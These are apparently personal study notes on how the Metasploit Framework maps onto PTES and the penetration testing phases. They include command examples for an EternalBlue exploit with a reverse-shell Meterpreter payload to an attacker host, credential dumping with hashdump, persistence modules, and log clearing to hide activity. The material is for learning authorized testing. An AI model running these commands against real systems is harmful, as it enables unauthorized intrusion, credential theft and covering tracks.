# Penetration Testing With MSF
## 🔧 MSF & the Penetration Testing Lifecycle

The **Metasploit Framework** isn’t just an exploitation tool—it’s a full-fledged penetration testing platform that can support **automation, scripting, and post-exploitation**. To properly utilize it, you should understand where it fits in the **PTES phases**.

---

## 📜 PTES Overview

![[Pasted image 20250615233203.png]]

The **PTES** has 7 phases:

1. **Pre-engagement Interactions**
    
2. **Intelligence Gathering**
    
3. **Threat Modelling**
    
4. **Vulnerability Analysis**
    
5. **Exploitation**
    
6. **Post-Exploitation**
    
7. **Reporting**


---

### 🔍 1. Pre-engagement Interactions

- **Objective**: Define scope, RoE, authorization, timeframes, goals.
    
- **MSF Role**: Minimal to none here. Use this phase to determine if Metasploit will be permitted during the test (especially for noisy modules).


---

### 🌐 2. Intelligence Gathering (Recon)

- **Objective**: Identify target assets, services, and relationships.
    
- **MSF Usage**:
    
    - `auxiliary/scanner/` modules for port scanning, banner grabbing.
        
        - e.g., `auxiliary/scanner/portscan/tcp`
            
    - `auxiliary/gather/` modules to scrape emails, hosts, usernames.
        

🔧 _Also integrate tools like Nmap (can import XML into MSFdb), Recon-ng, and Maltego here._

---

### 🧠 3. Threat Modeling

- **Objective**: Build a threat profile, map attack surface.
    
- **MSF Usage**:
    
    - Use gathered data to map out potential attack paths.
        
    - Plan relevant payloads/modules accordingly.
        
    - MSF isn't directly used here but indirectly supports analysis (via `db_nmap`, loot, etc.).
        

---

### 🛠️ 4. Vulnerability Analysis

- **Objective**: Find exploitable vulnerabilities.
    
- **MSF Usage**:
    
    - `auxiliary/scanner/` modules for:
        
        - Service versioning (`auxiliary/scanner/http/http_version`)
            
        - Known CVE checks (e.g., `scanner/smb/smb_ms17_010`)
            
    - Third-party tool integration (e.g., Nexpose/InsightVM → MSF Console via `db_import`).
        

---

### 💥 5. Exploitation

- **Objective**: Gain unauthorized access.
    
- **MSF Usage**:
    
    - Use `exploit/` modules targeting found vulnerabilities.
        
    - Match target + payload:
        
        - e.g., `exploit/windows/smb/ms17_010_eternalblue` + `payload/windows/x64/meterpreter/reverse_tcp`
            
    - Custom payloads via `msfvenom`.
        
    - Sessions management via `sessions` command.
        

🔥 This is MSF’s sweet spot.

---

### 🦾 6. Post-Exploitation

- **Objective**: Expand access, extract data, maintain persistence.
    
- **MSF Usage**:
    
    - `meterpreter` functionality: `hashdump`, `screenshots`, `kiwi`, `pivoting`, `persistence`.
        
    - Use `post/` modules:
        
        - e.g., `post/windows/gather/credentials/windows_autologin`
            
        - `post/multi/manage/autoroute` for pivoting.
            

---

### 🧾 7. Reporting

- **Objective**: Communicate findings clearly.
    
- **MSF Usage**:
    
    - `loot` and `notes` system in MSF tracks data.
        
    - Output `sessions`, `hosts`, `services` tables.
        
    - `db_export` or third-party integrations for generating detailed reports.
        

---

## 🧠 Key Takeaways

- MSF isn’t just for _hacking_—it helps from **recon to post-exploitation**, especially when used with other tools.
    
- Get used to:
    
    - `msfconsole`
        
    - `msfvenom`
        
    - `db_nmap` + `workspace` management
        
    - Writing or customizing modules (`~/.msf4/modules/`)

# Penetration Testing Phases

The following diagram outlines the various phases involved in a typical penetration test

![[Pasted image 20250615233241.png]]

### 🔵 **1. Information Gathering**

> _“What’s out there?”_

This is the **passive** and **active** collection of data about the target without touching it (passive) or by interacting directly (active). You're basically figuring out:

- What IPs, domains, or assets are in scope?
    
- What services are running?
    
- What can I find from OSINT?
    

**Tools**: Whois, NSLookup, Shodan, Nmap (for active), Google dorks.

---

### 🔵 **2. Enumeration**

> _“Let’s interrogate those services.”_

Now you're taking what you discovered and probing it harder:

- What users exist?
    
- What shared resources are exposed?
    
- What version of software is running?
    
- Are there any misconfigs or default creds?
    

This is where you're pulling **structured, specific details** from targets. It's **louder** than Info Gathering and often unauthenticated.

**Examples**:

- Enumerating SMB shares
    
- Dumping SNMP strings
    
- Bruteforcing login portals
    

---

### 🔵 **3. Exploitation**

> _“Time to break in.”_

This is the flashy part—launching attacks to gain **initial access** by exploiting vulnerabilities:

- Buffer overflows
    
- Web app flaws (SQLi, RCE)
    
- Misconfigurations
    

Your goal is a **foothold**—a shell, a session, a backdoor. The key is **controlled execution** and **low noise** unless you’re doing a red-team-style op.

---

### 🔵 **4. Post Exploitation**

> _“Now what can I do _inside_?”_

Now that you're in, you're acting like an insider:

- Gathering system, user, and domain info
    
- Checking if you’re in a sandbox or real machine
    
- Dumping credentials or tokens
    
- Laying groundwork for further compromise
    

This is **where real value lies**—you assess **impact** from a breach, not just “got in, gg.”

---

### 🔵 **5. Privilege Escalation**

> _“Let’s go from user to admin/root.”_

Rarely do you land as `root` or `NT AUTHORITY\SYSTEM` on the first shot. This phase is all about:

- Exploiting kernel or local vulnerabilities
    
- Misconfigured permissions (e.g., `sudo`, SUID, services)
    
- Reusing credentials (e.g., SSH keys, local admin creds)
    

Goal: get higher-level control to **own** the system.

---

### 🔵 **6. Maintaining Persistent Access**

> _“Make sure I can come back.”_

After privilege escalation, you want **persistence**:

- Plant backdoors or scheduled tasks
    
- Add users or SSH keys
    
- Create reverse shells or RATs that auto-start
    

In red teaming or longer-term tests, persistence is key to simulate **APT-style** threats.

---

### 🔵 **7. Clearing Tracks**

> _“Hide the fact I was here.”_

To avoid detection:

- Delete logs (`.bash_history`, Event Logs)
    
- Remove malware, shells, created users
    
- Clean up tools or evidence of file transfers
    

Some clients may **not** want this part performed depending on RoE—**ask before you wipe**.

---

## 🧠 Summary Table

|Phase|Purpose|
|---|---|
|Information Gathering|Discover target footprint (passive/active)|
|Enumeration|Extract structured data (users, shares)|
|Exploitation|Gain initial access via vulnerabilities|
|Post Exploitation|Assess internal state and gather data|
|Privilege Escalation|Elevate access to admin/root|
|Maintaining Access|Stay in the system for future access|
|Clearing Tracks|Erase evidence to avoid detection|

## 🧨 Penetration Testing with Metasploit Framework (MSF)

|**Penetration Testing Phase**|**Metasploit Implementation**|
|---|---|
|**1. Information Gathering & Enumeration**|🔹 **Auxiliary Modules**• `auxiliary/scanner/` – Port scanning, service detection• `auxiliary/gather/` – Email, credentials, etc.🔹 **`db_nmap`** for storing scan results|
|**2. Vulnerability Scanning**|🔹 **Auxiliary Modules**• `scanner/` modules for protocol-specific vuln checks (e.g. SMB, FTP)🔹 **Nessus/Other Scanners**• Import `.nessus` or `.xml` scan results into MSF DB|
|**3. Exploitation**|🔹 **Exploit Modules** (`exploit/`)• Target-specific exploits (e.g., EternalBlue, VSFTPD backdoor)🔹 **Payloads** (`payload/`)• Customizable reverse shells, Meterpreter, etc.|
|**4. Post Exploitation**|🔹 **Meterpreter** Sessions• Commands like `sysinfo`, `getuid`, `hashdump`, `screenshare`🔹 **Post Modules** (`post/`)• Gather creds, pivot, privilege checks|
|**5. Privilege Escalation**|🔹 **Post Exploitation Modules**• `post/multi/recon/local_exploit_suggester`• Kernel/driver-based escalation🔹 **Meterpreter Priv Commands** (`getsystem`, `getprivs`)|
|**6. Maintaining Persistent Access**|🔹 **Post Exploitation Modules**• `post/windows/manage/persistence`🔹 **Persistence Scripts/Modules**• Set up services, startup entries, or cron jobs|
|**7. Clearing Tracks**|🔹 Meterpreter Commands• `clearev` – Clears event logs• Manually remove files, users, artifacts⚠️ **Use with caution – may breach RoE**|

### 🔧 Example Commands by Phase

- **Enumeration**:
    
    ```bash
    use auxiliary/scanner/ftp/ftp_version
    set RHOSTS 192.168.1.0/24
    run
    ```
    
- **Exploitation**:
    
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST <attacker IP>
    run
    ```
    
- **Post Exploitation**:
    
    ```bash
    sessions -i 1
    hashdump
    getuid
    ```
    
- **Privilege Escalation**:
    
    ```bash
    use post/multi/recon/local_exploit_suggester
    set SESSION 1
    run
    ```
    
- **Persistence**:
    
    ```bash
    use persistence
    ```

### 🧠 Final Pro Tip:

Always separate your **workspaces** per target/client using:

```bash
workspace -a client_name
```

and maintain clean session, loot, and host tracking.
